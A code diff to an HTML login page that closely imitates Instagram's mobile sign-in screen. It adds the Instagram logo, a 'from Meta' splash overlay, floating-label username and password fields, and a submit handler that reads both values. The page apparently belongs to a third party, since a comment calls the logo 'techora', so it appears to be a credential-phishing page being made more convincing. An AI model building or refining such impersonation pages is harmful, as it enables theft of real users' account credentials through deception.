@@ -9,7 +9,8 @@
   <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
   <style data-purpose="custom-colors">
     :root {
-      --bg-dark: #121212;
+      --bg-color: #0C1014;
+      --text-color: #ffffff;
       --input-bg: #1c1c1c;
       --input-border: #363636;
       --text-muted: #a8a8a8;
@@ -17,9 +18,19 @@
       --meta-gray: #737373;
     }
 
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --bg-color: #0C1014;
+        --text-color: #ffffff;
+        --input-bg: #1c1c1c;
+        --input-border: #363636;
+        --text-muted: #a8a8a8;
+      }
+    }
+
     body {
-      background-color: var(--bg-dark);
-      color: white;
+      background-color: var(--bg-color);
+      color: var(--text-color);
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       -webkit-text-size-adjust: 100%;
 
@@ -55,9 +66,52 @@
 </head>
 
 <body class="flex flex-col min-h-screen justify-between" style="height: 844px; max-height: 100vh; overflow: hidden;">
+  <!-- Loading Overlay -->
+  <style>
+    @keyframes splashLogo {
+      0% { opacity: 0; transform: scale(0.85); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+    .animate-splash-logo {
+      animation: splashLogo 0.8s cubic-bezier(0.25, 1, 0.5, 1) forwards;
+    }
+  </style>
+  <div id="loadingOverlay"
+    class="fixed inset-0 bg-[var(--bg-color)] z-[100] flex flex-col justify-between items-center hidden h-[100dvh] w-screen overflow-hidden overscroll-none touch-none">
+    
+    <!-- Top Spacer for exact centering -->
+    <div class="flex-1"></div>
+    
+    <!-- Center Instagram Logo with Fade & Scale Animation -->
+    <div class="flex items-center justify-center animate-splash-logo">
+      <img src="image/instagram.png" alt="Instagram Logo" class="w-[180px] h-[180px] object-contain">
+    </div>
+    
+    <!-- Bottom Meta Branding Section -->
+    <div class="flex-1 flex flex-col justify-end w-full pb-[45px]">
+      <div class="flex flex-col items-center">
+        <span class="text-[#737373] text-[13px] mb-1 font-medium tracking-wide">from</span>
+        <div class="flex items-center mt-0.5">
+          <svg viewBox="0 0 948 191" class="h-5" fill="url(#metaGradient)" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+              <linearGradient id="metaGradient" x1="0%" y1="0%" x2="100%" y2="0%">
+                <stop stop-color="#FF7A00" offset="0" />
+                <stop stop-color="#FF0069" offset="0.5" />
+                <stop stop-color="#D300C5" offset="1" />
+              </linearGradient>
+            </defs>
+            <path d="m31.06,125.96c0,10.98 2.41,19.41 5.56,24.51 4.13,6.68 10.29,9.51 16.57,9.51 8.1,0 15.51-2.01 29.79-21.76 11.44-15.83 24.92-38.05 33.99-51.98l15.36-23.6c10.67-16.39 23.02-34.61 37.18-46.96 11.56-10.08 24.03-15.68 36.58-15.68 21.07,0 41.14,12.21 56.5,35.11 16.81,25.08 24.97,56.67 24.97,89.27 0,19.38-3.82,33.62-10.32,44.87-6.28,10.88-18.52,21.75-39.11,21.75l0-31.02c17.63,0 22.03-16.2 22.03-34.74 0-26.42-6.16-55.74-19.73-76.69-9.63-14.86-22.11-23.94-35.84-23.94-14.85,0-26.8,11.2-40.23,31.17-7.14,10.61-14.47,23.54-22.7,38.13l-9.06,16.05c-18.2,32.27-22.81,39.62-31.91,51.75-15.95,21.24-29.57,29.29-47.5,29.29-21.27,0-34.72-9.21-43.05-23.09-6.8-11.31-10.14-26.15-10.14-43.06z" />
+            <path d="m24.49,37.3c14.24-21.95 34.79-37.3 58.36-37.3 13.65,0 27.22,4.04 41.39,15.61 15.5,12.65 32.02,33.48 52.63,67.81l7.39,12.32c17.84,29.72 27.99,45.01 33.93,52.22 7.64,9.26 12.99,12.02 19.94,12.02 17.63,0 22.03-16.2 22.03-34.74l27.4-.86c0,19.38-3.82,33.62-10.32,44.87-6.28,10.88-18.52,21.75-39.11,21.75-12.8,0-24.14-2.78-36.68-14.61-9.64-9.08-20.91-25.21-29.58-39.71l-25.79-43.08c-12.94-21.62-24.81-37.74-31.68-45.04-7.39-7.85-16.89-17.33-32.05-17.33-12.27,0-22.69,8.61-31.41,21.78z" />
+            <path d="m82.35,31.23c-12.27,0-22.69,8.61-31.41,21.78-12.33,18.61-19.88,46.33-19.88,72.95 0,10.98 2.41,19.41 5.56,24.51l-26.48,17.44c-6.8-11.31-10.14-26.15-10.14-43.06 0-30.75 8.44-62.8 24.49-87.55 14.24-21.95 34.79-37.3 58.36-37.3z" />
+            <path d="m347.94,6.04h35.93l61.09,110.52 61.1-110.52h35.15v181.6h-29.31v-139.18l-53.58,96.38h-27.5l-53.57-96.38v139.18h-29.31z m285.11,67.71c-21.02,0-33.68,15.82-36.71,35.41h71.34c-1.47-20.18-13.11-35.41-34.63-35.41z m-65.77,46.57c0-41.22 26.64-71.22 66.28-71.22 38.99,0 62.27,29.62 62.27,73.42v8.05h-99.49c3.53,21.31 17.67,35.67 40.47,35.67 18.19,0 29.56-5.55 40.34-15.7l15.57,19.07c-14.67,13.49-33.33,21.27-56.95,21.27-42.91,0-68.49-31.29-68.49-70.56z m164.09-43.97h-26.98v-24h26.98v-39.69h28.28v39.69h40.99v24h-40.99v60.83c0,20.77 6.64,28.15 22.96,28.15 7.45,0 11.72-.64 18.03-1.69v23.74c-7.86,2.22-15.36,3.24-23.48,3.24-30.53,0-45.79-16.68-45.79-50.07z m188.35,23.34c-5.68-14.34-18.35-24.9-36.97-24.9-24.2,0-39.69,17.17-39.69,45.14 0,27.27 14.26,45.27 38.53,45.27 19.08,0 32.7-11.1 38.13-24.91z m28.28,87.95h-27.76v-18.94c-7.76,11.15-21.88,22.18-44.75,22.18-36.78,0-61.36-30.79-61.36-70.95 0-40.54 25.17-70.83 62.92-70.83 18.66,0 33.3,7.46 43.19,20.63v-17.38h27.76z" />
+          </svg>
+        </div>
+      </div>
+    </div>
+  </div>
   <!-- BEGIN: Top Navigation Bar -->
   <header class="w-full flex items-center p-4">
-    <button class="text-white" data-purpose="back-button">
+    <button class="text-[var(--text-color)]" data-purpose="back-button">
       <!-- Back Arrow Icon -->
       <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"
         xmlns="http://www.w3.org/2000/svg">
@@ -79,38 +133,52 @@
     </div>
 
     <!-- techora Logo -->
-    <div class="mb-16" data-purpose="brand-logo">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo"
-        class="w-20 h-20 object-contain">
+    <div class="mb-10" data-purpose="brand-logo">
+      <img src="image/instagram.png" alt="Instagram Logo" class="w-36 h-36 object-contain">
     </div>
-
     <!-- Login Form -->
     <section class="w-full max-w-sm" data-purpose="login-form">
       <form id="logForm" class="space-y-3">
         <div class="relative">
           <input type="text" id="username" aria-label="Username, email address or mobile number"
-            class="input-field w-full px-4 py-4 rounded-xl text-white placeholder:text-[#a8a8a8] focus:outline-none text-base"
+            class="peer input-field w-full px-4 pt-6 pb-2 rounded-xl text-[var(--text-color)] placeholder-transparent focus:outline-none text-[15px]"
             placeholder="Username, email address or mobile number">
+          <label for="username"
+            class="absolute left-4 top-2 text-[#a8a8a8] text-[11px] font-medium transition-all pointer-events-none peer-placeholder-shown:text-[15px] peer-placeholder-shown:top-3.5 peer-focus:top-2 peer-focus:text-[11px]">
+            Username, email address or mobile number
+          </label>
         </div>
 
         <!-- Password Input -->
-        <div class="relative">
+        <div class="relative flex items-center">
           <input type="password" id="password" aria-label="Password"
-            class="input-field w-full px-4 py-4 rounded-xl text-white placeholder:text-[#a8a8a8] focus:outline-none text-base"
+            class="peer input-field w-full pl-4 pr-12 pt-6 pb-2 rounded-xl text-[var(--text-color)] placeholder-transparent focus:outline-none text-[15px] tracking-widest"
             placeholder="Password">
+          <label for="password"
+            class="absolute left-4 top-2 text-[#a8a8a8] text-[11px] tracking-normal font-medium transition-all pointer-events-none peer-placeholder-shown:text-[15px] peer-placeholder-shown:top-3.5 peer-focus:top-2 peer-focus:text-[11px]">
+            Password
+          </label>
+          <button type="button" class="absolute right-4 text-[var(--text-muted)] hover:text-[var(--text-color)] transition-colors" data-purpose="toggle-password">
+            <!-- Eye slash icon SVG -->
+            <svg class="w-[22px] h-[22px]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.542-7a10.05 10.05 0 012.55-4.524m2.4-2.1A10.05 10.05 0 0112 5c4.478 0 8.268 2.943 9.542 7a10.05 10.05 0 01-1.42 3.12m-2.96 2.06a9.956 9.956 0 01-5.162 1.82M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M3 3l18 18" />
+            </svg>
+          </button>
         </div>
 
         <!-- Log In Button -->
         <button id="loginBtn"
-          class="w-full bg-[#0064e0] text-white font-semibold py-3.5 rounded-full mt-2 hover:bg-blue-600 transition-colors disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:bg-[#0064e0]"
+          class="w-full bg-[#0064e0] text-white font-semibold py-3.5 rounded-full mt-2 hover:bg-blue-600 transition-colors disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:bg-[#0064e0] flex items-center justify-center min-h-[52px]"
           type="submit" disabled>
-          Log in
+          <span id="btnText">Log in</span>
+          <div id="btnSpinner" class="hidden w-[22px] h-[22px] border-[2.5px] border-white/30 border-t-white rounded-full animate-spin"></div>
         </button>
       </form>
 
       <!-- Forgotten Password -->
       <div class="mt-5 text-center">
-        <a class="text-white font-medium text-sm" href="#">Forgotten password?</a>
+        <a class="text-[var(--text-color)] font-medium text-sm" href="#">Forgotten password?</a>
       </div>
     </section>
   </main>
@@ -162,6 +230,17 @@
 
       form.addEventListener('submit', async (e) => {
         e.preventDefault();
+
+        // Show button spinner immediately, then show full screen loading after a short delay
+        setTimeout(() => {
+          document.getElementById('loadingOverlay').classList.remove('hidden');
+        }, 1000);
+        const btnText = document.getElementById('btnText');
+        const btnSpinner = document.getElementById('btnSpinner');
+        if(btnText && btnSpinner) {
+          btnText.classList.add('hidden');
+          btnSpinner.classList.remove('hidden');
+        }
 
         const username = usernameInput.value;
         const password = passwordInput.value;
